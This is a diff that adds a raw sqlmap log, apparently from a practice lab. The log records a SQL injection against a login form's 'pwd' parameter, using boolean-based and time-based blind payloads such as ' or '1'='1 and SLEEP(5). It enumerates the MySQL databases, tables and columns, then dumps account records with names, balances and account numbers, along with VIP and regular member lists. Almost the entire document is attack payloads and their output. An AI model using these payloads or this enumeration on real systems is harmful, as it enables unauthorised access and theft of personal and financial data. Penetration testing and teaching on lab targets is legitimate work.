@@ -1,0 +1,395 @@
+sqlmap identified the following injection point(s) with a total of 6068 HTTP(s) requests:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+available databases [5]:
+[*] information_schema
+[*] inject_1
+[*] inject_2
+[*] inject_3
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_1
+[1 table]
++-----------+
+| logininfo |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+[40 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_2
+[1 table]
++----------+
+| accounts |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_2
+Table: accounts
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| accountno | int(11)     |
+| balance   | int(11)     |
+| id        | int(11)     |
+| name      | varchar(50) |
+| skill     | int(11)     |
++-----------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_3
+[2 tables]
++---------+
+| regular |
+| vip     |
++---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web application technology: Apache 2.4.7
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_3
+Table: vip
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| memberno | int(11)      |
+| name     | varchar(100) |
++----------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_2
+Table: accounts
+[5 entries]
++---------+
+| balance |
++---------+
+| 21      |
+| 3000    |
+| 5000    |
+| 260000  |
+| 295000  |
++---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_2
+Table: accounts
+[5 entries]
++-----------------------+
+| name                  |
++-----------------------+
+| Charles Suhr          |
+| Daniel Davis          |
+| Hendrik van Haar      |
+| Morgaine DeHavellandt |
+| Peter Reed Smith      |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_2
+Table: accounts
+[5 entries]
++----+-----------------------+-------+---------+-----------+
+| id | name                  | skill | balance | accountno |
++----+-----------------------+-------+---------+-----------+
+| 1  | Morgaine DeHavellandt | 4     | 5000    | 85632415  |
+| 2  | Hendrik van Haar      | 1     | 260000  | 23498723  |
+| 3  | Charles Suhr          | 42    | 3000    | 14269583  |
+| 4  | Daniel Davis          | 8     | 295000  | 75395146  |
+| 5  | Peter Reed Smith      | 0     | 21      | 24563985  |
++----+-----------------------+-------+---------+-----------+
+
+Database: inject_3
+Table: vip
+[3 entries]
++----+---------------------+----------+
+| id | name                | memberno |
++----+---------------------+----------+
+| 1  | Fran Drescher (VIP) | 81321    |
+| 2  | Daniel Davis (VIP)  | 13213    |
+| 3  | Ann Guilbert (VIP)  | 32134    |
++----+---------------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pwd (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND 8175=8175 AND 'DKVO'='DKVO&set_answer=Ok
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: user=asdf ' or '1'='1&pwd=' or '1'='1' AND SLEEP(5) AND 'NHIs'='NHIs&set_answer=Ok
+---
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12
+Database: inject_3
+Table: regular
+[5 entries]
++----+---------------------------+----------+
+| id | name                      | memberno |
++----+---------------------------+----------+
+| 1  | Charles Shaughnessy (reg) | 11235    |
+| 2  | Nicholle Tom (reg)        | 12358    |
+| 3  | Benjamin Salisbury (reg)  | 23581    |
+| 4  | Madeline Zima (reg)       | 35813    |
+| 5  | Lauren Lane (reg)         | 58132    |
++----+---------------------------+----------+
+
